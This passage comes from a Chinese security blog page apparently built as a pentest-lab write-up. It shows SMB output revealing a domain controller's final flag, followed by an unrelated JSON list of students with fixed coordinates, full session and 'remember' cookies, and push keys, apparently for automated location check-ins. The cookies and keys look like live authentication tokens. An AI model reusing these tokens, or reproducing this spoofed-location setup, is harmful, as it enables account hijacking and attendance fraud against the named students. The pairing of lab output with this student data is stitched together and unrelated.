+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             / /  <span class=se>\\</span> __/ /___ //     <span class=p>|</span> <span class=p>|</span> <span class=o>((</span>___/ / //    <span class=p>|</span> <span class=p>|</span> //     <span class=p>|</span> <span class=p>|</span> //   <span class=p>|</span>/ / <span class=o>((</span>____/ /
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             flag03: e8f88d0d43d6<span class=o>}</span>
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.
+</span></span><span class=line><span class=cl>                                                                        
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;students&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;yst&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;s=70R7MBhip4eBuykjpHt3eRjkgElSu9NJqIhmRleW; remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=4301236%7CUXztbF4hKjWgVEANujINP0TkvgTu1ubqBL6XAlfYMGTPCP2kp2ihQU1l2xE4%7C%242y%2410%24SlXd98MiAClJUxPQHkp3q.rxEdHM5YfcwYCtqm3dN2U2k4L0b4PUi; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJwYWdlQ291bnRlciUyMiUzQTAlN0Q=&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;16ab07db12df7ec4aa914a64745f82f8&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;cyh&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;s=X2ut5ymXP1kLj7OzuP2HU1kpO27z1sJPSY4pEwAs; remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3260040%7CRVrV5jpg3jIEsPN8ZDHZTB4qAiChL97ilmh7gMQKKgPr9qmIEkJ1PhNSKHZE%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJwYWdlQ291bnRlciUyMiUzQTAlN0Q=&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;0194daf908324b0469be9eb80a9871d9&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;cch&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;s=8MSfaGU0woulOFthiwagpfEdbcgxIpqeaLKfa6Zr; remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3259549%7ChNsRpn2y2w8ERdJCqB160OvpOrOrecXVD6ZiyzdpUXIG2sKo5CTz2Rbgujy7%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJwYWdlQ291bnRlciUyMiUzQTAlN0Q=&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;66a0b7f55705d79d2b8ed6be3c0a07ea&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;wsy&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;s=xlI8xVOw6soDDxQVHO9jurg4hB8ByVmKCAfvEvKp; remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3259554%7Comq3L2Wj0jlFGwQlMEtoZcr5zSPXz6BW6Qos2WssfiSJeFSQLPHm1H7N6POc%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJwYWdlQ291bnRlciUyMiUzQTAlN0Q=&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;0194daf908324b0469be9eb80a9871d9&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;zgh&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;s=nTYlnQFzdrSoMCbk7A9Dg7zP39wOwpPRWSPasGx0; remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3260011%7C8MrFXxGtp5EjAriYsMxOH0mkwohEO8Nq4At7VbDyow2ioNYA0INIbKpZEmWP%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJiYjAzNDRhNy04ZTE4LTQ4OTItYWQ0Yi04YmJiYTA0Y2ViNjMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY4MDIyOTAxJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJwYWdlQ291bnRlciUyMiUzQTAlN0Q=&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;7ebaeefd84eba46a2ee77c3c071bd632&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;gh&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;s=CS9gbWuDjyLOMrLHavakKGMEAWdil2e3tDjyZ18t; remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3260416%7CuGoNBnjIyuXZXznQ9bOHKcjpiCzYQ8Vm2samlAu6tsPCqzKJntQutfv9CvkT%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJwYWdlQ291bnRlciUyMiUzQTAlN0&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;16ab07db12df7ec4aa914a64745f82f8&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;chn&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3259920%7CxA4a5zZ20jERuvtzaboJL6nwsJBrNOj3d7gQxz4frMg8fjO3W7z3gtldMfKT%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJwYWdlQ291bnRlciUyMiUzQTAlN0Q=&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;7ebaeefd84eba46a2ee77c3c071bd632&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;wyj&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;s=g282mBFaqwTmHitHGoalnZv5k7PP0Y899PNTrAAP; remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3260000%7CtQZ8ff3DsGUhi2ofY8b7HYlPMb9WOSMAnUXn4yKMD92DE8ytAs2JhK5vVYsm%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJwYWdlQ291bnRlciUyMiUzQTAlN0Q=&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;b120fbca2afad07be0644e03bc1a7438&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;zzt&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3281025%7CrHbOJqwz5JPWqWHyhfxSLAecyCVIgBRpE4W5uCZgHzLnc7ZCPf3ElwDewFuM%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJ&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;66a0b7f55705d79d2b8ed6be3c0a07ea&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>	<span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;zjy&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3259693%7Cg4ELjVgSBIL6wzm6S67Asv1uRKYODcj5Rt6sMQ6x6X75uAqawk3p20lQgho5%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJ&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;66a0b7f55705d79d2b8ed6be3c0a07ea&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>	<span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;cyz&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;class&#34;</span>: <span class=s2>&#34;107492&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lat&#34;</span>: <span class=s2>&#34;26.03816&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;lng&#34;</span>: <span class=s2>&#34;119.18831&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;acc&#34;</span>: <span class=s2>&#34;30&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;cookie&#34;</span>: <span class=s2>&#34;remember_student_59ba36addc2b2f9401580f014c7f58ea4e30989d=3259485%7CfugAy5xoW77rV4YeKL3Wtepb231wWfMGMUm5Gg5YOeovMvO4kEPBuxzw8XvF%7C; AMP_16e8798ff2=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmODZhOWFlYi04ZDdkLTQwOTQtOTFhNS1mYzMwM2FmMGZmMGMlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzY0MTY3NjA3MzUwJ&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;QmsgKEY&#34;</span>: <span class=s2>&#34;66a0b7f55705d79d2b8ed6be3c0a07ea&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;WXKey&#34;</span>: <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div></div><footer class=post-footer><div class=post-footer__tags><a href=/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/ data-pagefind-filter=tag>春秋云镜</a>
+<a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ data-pagefind-filter=tag>内网渗透</a></div><div class=post-footer__license>Licensed under CC BY-NC-SA 4.0</div><nav class=post-footer__nav><a href=/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ctsclient%E5%A4%8D%E7%9B%98/><small>← Previous</small>
+<span>春秋云镜Tsclient复盘</span>
+</a><a href=/p/%E7%BE%A4%E5%8F%8B%E5%A4%A7%E4%BD%AC%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ class=post-footer__nav-next><small>Next →</small>
+<span>渗透测试大佬博客与知识库</span></a></nav></footer></article><aside class=post-layout__aside><div class=toc><div class=toc__title>Contents</div><nav id=TableOfContents><ol><li><a href=#flag1>flag1</a></li><li><a href=#flag2>flag2</a></li><li><a href=#flag3>flag3</a></li></ol></nav></div></aside></div><template id=toc-mobile-tpl><button class=toc-fab id=toc-fab type=button aria-label=打开目录>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg></button><div class=toc-drawer__overlay id=toc-drawer-overlay></div><aside class=toc-drawer id=toc-drawer role=dialog aria-modal=true aria-label=文章目录><div class=toc-drawer__handle aria-hidden=true></div><div class=toc-drawer__header><span class=toc-drawer__title>目录</span>
+<button class=toc-drawer__close id=toc-drawer-close type=button aria-label=关闭目录>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><div class="toc toc-drawer__content"><nav class=toc-drawer__nav><ol><li><a href=#flag1>flag1</a></li><li><a href=#flag2>flag2</a></li><li><a href=#flag3>flag3</a></li></ol></nav></div></aside></template></div><footer class=site-footer><div class=container><div class=site-footer__social><a href=https://github.com/GCXWLP target=_blank rel=noopener title=GitHub><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
+</a><a href=mailto:eminemgcxwlp@gmail.com target=_blank rel=noopener title=Email><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</a><a href=/index.xml target=_blank rel=noopener title=RSS><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><div class=site-footer__copy>&copy; 2025 - 2026 Twansh's blog</div><div class=site-footer__stats><span>65 posts</span>
+<span>73.3k words</span></div><div class=site-footer__powered>Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a></div></div></footer><div class=search-overlay id=search-overlay role=dialog aria-label=Search><div class=search-overlay__dialog><div class=search-overlay__input-wrap><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+<input type=text id=search-input placeholder=搜索文章标题、标签、分类或正文... autocomplete=off></div><div class=search-overlay__results id=search-results><div class=search-overlay__empty>输入关键词开始搜索</div></div></div></div><script defer src=/js/theme-toggle.min.9d3288aa4ff1e33e40906fb67350ea3f5dad1533f19d7428a2335ceac6bf3c4e.js></script><script defer src=/js/search.min.6145f9c11b47c22f4014c24c80522fe739d7844fc997719a3bc26c050c908051.js></script><script defer src=/js/code-copy.min.f61de5ab74980e8e52ca0081d6fedb33bc5496b41391a410ef15ed6e014e502d.js></script><script defer src=/js/toc.min.c478fb80ad68dc9f44f00689b23d39261c2507596ea06147d49cd7efdbe36c36.js></script><script defer src=/js/lightbox.min.0c5e41aab8770358537c2bdf79007e06c974fcc4d05380a8f5fc0a4ed6e5bab9.js></script></body></html>
